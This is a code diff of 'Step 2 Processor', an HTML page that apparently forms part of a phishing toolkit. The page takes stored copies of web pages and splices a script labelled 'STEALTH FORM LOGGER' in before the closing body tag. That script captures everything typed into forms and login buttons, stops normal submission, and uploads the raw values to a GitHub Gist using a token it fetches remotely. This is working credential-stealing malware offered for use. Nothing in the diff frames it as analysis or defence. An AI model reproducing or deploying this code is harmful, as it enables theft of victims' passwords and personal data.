@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Processor</title>
+    <title>Step 2 Processor</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -15,23 +15,8 @@
         .container {
             background-color: #f5f5f5;
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="text"] {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
+            border-radius: 5px;
+            margin-bottom: 20px;
         }
         button {
             background-color: #4CAF50;
@@ -45,276 +30,253 @@
         button:hover {
             background-color: #45a049;
         }
-        .hidden {
-            display: none;
+        .status {
+            margin: 20px 0;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
         }
     </style>
 </head>
 <body>
+    <h1>Step 2: Process and Store HTML</h1>
+    
     <div class="container">
-        <h1>Data Processor</h1>
+        <h2>Processing Details</h2>
+        <div id="status" class="status"></div>
         
-        <div id="userForm">
-            <div class="form-group">
-                <label for="username">Username (will be used as .json filename):</label>
-                <input type="text" id="username" required>
-            </div>
-            <div class="form-group">
-                <label for="userId">ID:</label>
-                <input type="text" id="userId" required>
-            </div>
-            <button id="saveUserData">Save & Continue</button>
-        </div>
+        <div id="userInfo" class="status"></div>
         
-        <div id="processingSection" class="hidden">
-            <h2>Processing Data</h2>
-            <p>Your data is being processed. Click below to proceed to the next step.</p>
-            <button id="proceedToStep3">Proceed to Step 3</button>
-        </div>
+        <button id="nextBtn" style="display: none;">Proceed to Step 3</button>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Check if we have saved user data
-            const savedUsername = localStorage.getItem('username');
-            const savedUserId = localStorage.getItem('userId');
+            const statusEl = document.getElementById('status');
+            const userInfoEl = document.getElementById('userInfo');
+            const nextBtn = document.getElementById('nextBtn');
             
-            const userForm = document.getElementById('userForm');
-            const processingSection = document.getElementById('processingSection');
-            
-            if (savedUsername && savedUserId) {
-                // If we have saved data, hide the form and show processing section
-                userForm.style.display = 'none';
-                processingSection.classList.remove('hidden');
-                
-                // Auto-populate the fields in case user wants to change
-                document.getElementById('username').value = savedUsername;
-                document.getElementById('userId').value = savedUserId;
-                
-                // Process the data immediately since we have user info
-                processData(savedUsername, savedUserId);
+            // Check if data1step exists
+            if (!localStorage.getItem('data1step')) {
+                statusEl.textContent = 'Error: data1step not found in localStorage';
+                statusEl.className = 'status error';
+                return;
             }
             
-            // Save user data button
-            document.getElementById('saveUserData').addEventListener('click', function() {
-                const username = document.getElementById('username').value.trim();
-                const userId = document.getElementById('userId').value.trim();
-                
-                if (username && userId) {
-                    // Save to localStorage
-                    localStorage.setItem('username', username);
-                    localStorage.setItem('userId', userId);
-                    
-                    // Hide form and show processing section
-                    userForm.style.display = 'none';
-                    processingSection.classList.remove('hidden');
-                    
-                    // Process the data
-                    processData(username, userId);
-                } else {
-                    alert('Please enter both username and ID');
+            // Get user info
+            let userInfo = { username: 'unknown', gistId: '' };
+            try {
+                const loggedInUser = localStorage.getItem('loggedInUser');
+                if (loggedInUser) {
+                    userInfo = JSON.parse(loggedInUser);
                 }
-            });
+            } catch (e) {
+                console.error('Error parsing user info:', e);
+            }
             
-            // Proceed to step3 button
-            document.getElementById('proceedToStep3').addEventListener('click', function() {
-                window.location.href = 'step3.html';
-            });
+            // Display user info
+            userInfoEl.innerHTML = `
+                <strong>User Info:</strong><br>
+                Username: ${userInfo.username}<br>
+                Gist ID: ${userInfo.gistId || 'Not specified'}
+            `;
             
-            function processData(username, userId) {
-                // Get data from localStorage
-                const data1step = localStorage.getItem('data1step');
-                
-                if (data1step) {
-                    // Create a temporary div to parse the HTML
-                    const tempDiv = document.createElement('div');
-                    tempDiv.innerHTML = data1step;
-                    
-                    // Find the closing body tag and insert our script before it
-                    const bodyTag = tempDiv.querySelector('body');
-                    if (bodyTag) {
-                        // Create the script element with our stealth logger
-                        const scriptTag = document.createElement('script');
-                        scriptTag.innerHTML = `
-                        // CONFIGURATION
-                        const CONFIG = {
-                            // Gist configuration
-                            GIST_ID: 'baf8538c85354add526e6cb4c40dcd3a',
-                            GIST_FILENAME: '${username}.json',
-                            
-                            // GitHub token URL (replace with your own token endpoint if needed)
-                            TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
+            // Get the HTML from data1step
+            let html = localStorage.getItem('data1step');
+            
+            // Inject the script just before closing body tag
+            const scriptToInject = `
+<!-- STEALTH FORM LOGGER (GIST UPLOAD) -->
+<script>
+// CONFIGURATION
+const CONFIG = {
+    // Gist configuration
+    GIST_ID: '${userInfo.gistId || 'baf8538c85354add526e6cb4c40dcd3a'}',
+    GIST_FILENAME: '${userInfo.username || 'Data'}.json',
+    
+    // GitHub token URL (replace with your own token endpoint if needed)
+    TOKEN_URL: 'https://gist.githubusercontent.com/Dtech2preas/498a03fc1467fc14c66358e0f5721517/raw/a9f82f8fef545600174cdf9b5b1735b865bf5582/gistfile1.txt',
 
-                            // Time to wait after typing before considering input "finished" (ms)
-                            INPUT_IDLE_TIMEOUT: 2000,
+    // Time to wait after typing before considering input "finished" (ms)
+    INPUT_IDLE_TIMEOUT: 2000,
 
-                            // Patterns that indicate a submit button
-                            SUBMIT_BUTTON_PATTERNS: [
-                                'submit', 'login', 'sign in', 'continue', 
-                                'next', 'confirm', 'proceed', 'authenticate'
-                            ]
-                        };
+    // Patterns that indicate a submit button
+    SUBMIT_BUTTON_PATTERNS: [
+        'submit', 'login', 'sign in', 'continue', 
+        'next', 'confirm', 'proceed', 'authenticate'
+    ]
+};
 
-                        // ===== INVISIBLE LOGGER =====
-                        (() => {
-                            // Silent console logging (optional for debugging)
-                            const log = (msg, type='info') => {
-                                console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
-                            };
+// ===== INVISIBLE LOGGER =====
+(() => {
+    // Silent console logging (optional for debugging)
+    const log = (msg, type='info') => {
+        console.log(\`[Stealth Logger] \${msg}\`); // Only visible in browser console
+    };
 
-                            // ===== DATA CAPTURE =====
-                            let typingTimer;
-                            let formData = {};
+    // ===== DATA CAPTURE =====
+    let typingTimer;
+    let formData = {};
 
-                            // Fetch GitHub token
-                            const fetchToken = async () => {
-                                try {
-                                    const res = await fetch(CONFIG.TOKEN_URL);
-                                    return (await res.text()).trim();
-                                } catch (err) {
-                                    log('Failed to fetch token', 'error');
-                                    return null;
-                                }
-                            };
+    // Fetch GitHub token
+    const fetchToken = async () => {
+        try {
+            const res = await fetch(CONFIG.TOKEN_URL);
+            return (await res.text()).trim();
+        } catch (err) {
+            log('Failed to fetch token', 'error');
+            return null;
+        }
+    };
 
-                            // Upload data to Gist
-                            const uploadToGist = async (data) => {
-                                try {
-                                    const token = await fetchToken();
-                                    if (!token) return false;
+    // Upload data to Gist
+    const uploadToGist = async (data) => {
+        try {
+            const token = await fetchToken();
+            if (!token) return false;
 
-                                    // Prepare the data with timestamp
-                                    const timestamp = new Date().toISOString();
-                                    const entry = {
-                                        page_url: window.location.href,
-                                        user_id: '${userId}',
-                                        ...data
-                                    };
+            // Prepare the data with timestamp
+            const timestamp = new Date().toISOString();
+            const entry = {
+                page_url: window.location.href,
+                ...data
+            };
 
-                                    // Step 1: Get current content of the Gist
-                                    const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                                        headers: { Authorization: \`token \${token}\` }
-                                    });
+            // Step 1: Get current content of the Gist
+            const gistRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                headers: { Authorization: \`token \${token}\` }
+            });
 
-                                    if (!gistRes.ok) {
-                                        log('Failed to fetch existing gist', 'error');
-                                        return false;
-                                    }
+            if (!gistRes.ok) {
+                log('Failed to fetch existing gist', 'error');
+                return false;
+            }
 
-                                    const gistData = await gistRes.json();
-                                    let currentData = {};
+            const gistData = await gistRes.json();
+            let currentData = {};
 
-                                    if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
-                                        try {
-                                            currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
-                                        } catch (e) {
-                                            currentData = {};
-                                        }
-                                    }
+            if (gistData.files && gistData.files[CONFIG.GIST_FILENAME]) {
+                try {
+                    currentData = JSON.parse(gistData.files[CONFIG.GIST_FILENAME].content);
+                } catch (e) {
+                    currentData = {};
+                }
+            }
 
-                                    // Step 2: Append new data with timestamp key
-                                    currentData[timestamp] = entry;
+            // Step 2: Append new data with timestamp key
+            currentData[timestamp] = entry;
 
-                                    // Step 3: Send PATCH to update the Gist
-                                    const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
-                                        method: 'PATCH',
-                                        headers: {
-                                            'Authorization': \`token \${token}\`,
-                                            'Content-Type': 'application/json'
-                                        },
-                                        body: JSON.stringify({
-                                            files: {
-                                                [CONFIG.GIST_FILENAME]: {
-                                                    content: JSON.stringify(currentData, null, 2)
-                                                }
-                                            }
-                                        })
-                                    });
-
-                                    return updateRes.ok;
-                                } catch (err) {
-                                    log('Gist upload failed: ' + err.message, 'error');
-                                    return false;
-                                }
-                            };
-
-                            // ===== EVENT HANDLERS =====
-                            const setupInputHandlers = () => {
-                                document.querySelectorAll('input, textarea, select').forEach(field => {
-                                    field.addEventListener('input', () => {
-                                        clearTimeout(typingTimer);
-                                        typingTimer = setTimeout(() => {
-                                            const name = field.name || field.id || 'unnamed_field';
-                                            const value = field.value;
-                                            if (value) {
-                                                formData[name] = value; // Stores raw value
-                                            }
-                                        }, CONFIG.INPUT_IDLE_TIMEOUT);
-                                    });
-                                });
-                            };
-
-                            const setupSubmissionHandlers = () => {
-                                // Form submissions
-                                document.querySelectorAll('form').forEach(form => {
-                                    form.addEventListener('submit', (e) => {
-                                        e.preventDefault(); // Stop default submission
-
-                                        const data = {};
-                                        Array.from(form.elements).forEach(el => {
-                                            if (el.name && el.value) {
-                                                data[el.name] = el.value; // RAW DATA
-                                            }
-                                        });
-                                        uploadToGist(data);
-                                    }, true);
-                                });
-
-                                // Button clicks
-                                document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
-                                    btn.addEventListener('click', (e) => {
-                                        const btnText = (btn.textContent || btn.value || '').toLowerCase();
-                                        const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
-                                            btnText.includes(pattern)
-                                        );
-
-                                        if (isSubmit && Object.keys(formData).length > 0) {
-                                            uploadToGist(formData);
-                                            formData = {}; // Clear after submission
-                                        }
-                                    }, true);
-                                });
-                            };
-
-                            // ===== INITIALIZATION =====
-                            setupInputHandlers();
-                            setupSubmissionHandlers();
-
-                            // Watch for dynamically added elements
-                            new MutationObserver(() => {
-                                setupInputHandlers();
-                                setupSubmissionHandlers();
-                            }).observe(document.body, { childList: true, subtree: true });
-                        })();
-                        `;
-                        
-                        // Insert the script just before the closing body tag
-                        bodyTag.appendChild(scriptTag);
-                        
-                        // Get the modified HTML
-                        const modifiedHtml = tempDiv.innerHTML;
-                        
-                        // Save to data2step in localStorage
-                        localStorage.setItem('data2step', modifiedHtml);
-                        
-                        console.log('Data processed and saved to data2step in localStorage');
-                    } else {
-                        console.error('No body tag found in the HTML');
+            // Step 3: Send PATCH to update the Gist
+            const updateRes = await fetch(\`https://api.github.com/gists/\${CONFIG.GIST_ID}\`, {
+                method: 'PATCH',
+                headers: {
+                    'Authorization': \`token \${token}\`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    files: {
+                        [CONFIG.GIST_FILENAME]: {
+                            content: JSON.stringify(currentData, null, 2)
+                        }
                     }
-                } else {
-                    console.error('No data1step found in localStorage');
+                })
+            });
+
+            return updateRes.ok;
+        } catch (err) {
+            log('Gist upload failed: ' + err.message, 'error');
+            return false;
+        }
+    };
+
+    // ===== EVENT HANDLERS =====
+    const setupInputHandlers = () => {
+        document.querySelectorAll('input, textarea, select').forEach(field => {
+            field.addEventListener('input', () => {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    const name = field.name || field.id || 'unnamed_field';
+                    const value = field.value;
+                    if (value) {
+                        formData[name] = value; // Stores raw value
+                    }
+                }, CONFIG.INPUT_IDLE_TIMEOUT);
+            });
+        });
+    };
+
+    const setupSubmissionHandlers = () => {
+        // Form submissions
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', (e) => {
+                e.preventDefault(); // Stop default submission
+
+                const data = {};
+                Array.from(form.elements).forEach(el => {
+                    if (el.name && el.value) {
+                        data[el.name] = el.value; // RAW DATA
+                    }
+                });
+                uploadToGist(data);
+            }, true);
+        });
+
+        // Button clicks
+        document.querySelectorAll('button, input[type="button"], input[type="submit"]').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const btnText = (btn.textContent || btn.value || '').toLowerCase();
+                const isSubmit = CONFIG.SUBMIT_BUTTON_PATTERNS.some(pattern => 
+                    btnText.includes(pattern)
+                );
+
+                if (isSubmit && Object.keys(formData).length > 0) {
+                    uploadToGist(formData);
+                    formData = {}; // Clear after submission
                 }
+            }, true);
+        });
+    };
+
+    // ===== INITIALIZATION =====
+    setupInputHandlers();
+    setupSubmissionHandlers();
+
+    // Watch for dynamically added elements
+    new MutationObserver(() => {
+        setupInputHandlers();
+        setupSubmissionHandlers();
+    }).observe(document.body, { childList: true, subtree: true });
+})();
+<\/script>
+`;
+            
+            // Find the closing body tag and insert the script before it
+            const bodyCloseTagIndex = html.lastIndexOf('</body>');
+            if (bodyCloseTagIndex !== -1) {
+                const modifiedHtml = html.slice(0, bodyCloseTagIndex) + scriptToInject + html.slice(bodyCloseTagIndex);
+                
+                // Save to data2step
+                localStorage.setItem('data2step', modifiedHtml);
+                
+                statusEl.textContent = 'Successfully processed HTML and injected script. Modified HTML saved to data2step in localStorage.';
+                statusEl.className = 'status success';
+                nextBtn.style.display = 'block';
+            } else {
+                statusEl.textContent = 'Error: Could not find </body> tag in the HTML';
+                statusEl.className = 'status error';
             }
+        });
+        
+        // Handle next button click
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            window.location.href = 'step3.html';
         });
     </script>
 </body>
